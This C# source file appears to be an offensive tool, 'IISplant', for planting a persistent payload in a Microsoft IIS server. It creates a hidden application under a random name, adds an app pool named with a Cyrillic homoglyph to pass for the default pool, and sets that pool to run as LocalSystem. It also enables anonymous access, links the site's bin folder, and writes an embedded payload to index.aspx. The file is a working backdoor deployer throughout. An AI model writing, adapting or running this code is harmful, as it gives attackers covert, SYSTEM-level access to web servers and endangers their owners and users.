using Microsoft.Web.Administration;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace IISplant
{
    class Program
    {
        static void Main(string[] args)
        {
            var manager = new ServerManager();

            Console.WriteLine("Existing sites:");
            Console.WriteLine("0.) Exit");
            for (var i = 0; i < manager.Sites.Count; i++)
            {
                Console.WriteLine(i + 1 + ".) " + manager.Sites[i].Name);
            }
            Console.Write("Enter site to implant into (0 for none): ");
            var siteId = int.Parse(Console.ReadLine());
            if (siteId == 0 || siteId > manager.Sites.Count)
                return;
            var site = manager.Sites[siteId - 1];
            Console.WriteLine("Impanting into " + site.Name);

            var name = Path.GetRandomFileName().Split('.')[0];
            var dir = Path.Combine(Path.GetTempPath(), name);
            Directory.CreateDirectory(dir);
            Console.WriteLine("Created working directory: " + dir);

            //create app and associated app pool
            var app = site.Applications.Add("/" + name, dir);
            //Defаult App Pool - cyrillic a;
            var pool = manager.ApplicationPools.Add(name);
            pool.ProcessModel.IdentityType = ProcessModelIdentityType.LocalSystem; //runs as system
            app.ApplicationPoolName = pool.Name;

            var config = manager.GetApplicationHostConfiguration();
            var auth = config.GetSection("system.webServer/security/authentication/anonymousAuthentication", site.Name);
            auth.OverrideMode = OverrideMode.Allow;
            //use app pool user
            auth["userName"] = "";
            var sitePath = Path.Combine(site.Applications["/"].VirtualDirectories["/"].PhysicalPath, "bin");
            if(Directory.Exists(sitePath))
            {
                var psi = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "/c mklink /J " + Path.Combine(dir, "bin") + " " + sitePath,
                    CreateNoWindow = true,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                };
                var proc = new Process();
                proc.StartInfo = psi;

                Console.WriteLine("Creating symbolic link for bin directory.");
                proc.Start();
                proc.WaitForExit();
            }

            Console.WriteLine("Copying payload to index.aspx.");
            File.WriteAllText(Path.Combine(dir, "index.aspx"), GetPayload());

            manager.CommitChanges();
            Console.Write("Payload deployed\nPress any key to continue...");
            Console.ReadKey();
        }

        private static string GetPayload()
        {
            var assembly = Assembly.GetExecutingAssembly();
            var resourceName = "IISplant.payload.dat";
            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            {
                using (StreamReader reader = new StreamReader(stream))
                {
                    return reader.ReadToEnd();
                }
            }
        }
    }
}
